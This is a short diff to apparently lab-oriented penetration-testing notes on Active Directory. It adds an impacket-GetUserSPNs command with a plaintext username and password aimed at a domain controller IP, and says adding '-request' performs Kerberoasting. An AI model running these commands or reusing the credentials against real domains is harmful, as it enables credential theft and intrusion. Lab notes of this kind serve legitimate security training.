@@ -30,6 +30,10 @@ Windows
 
     Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
 
+Linux (Add -request to Kerberoast if needed)
+
+    impacket-GetUserSPNs nagoya-industries.com/craig.carr:Spring2023 -dc-ip 192.168.205.21
+
 ## Steps:
 
 ### 1) Create ST
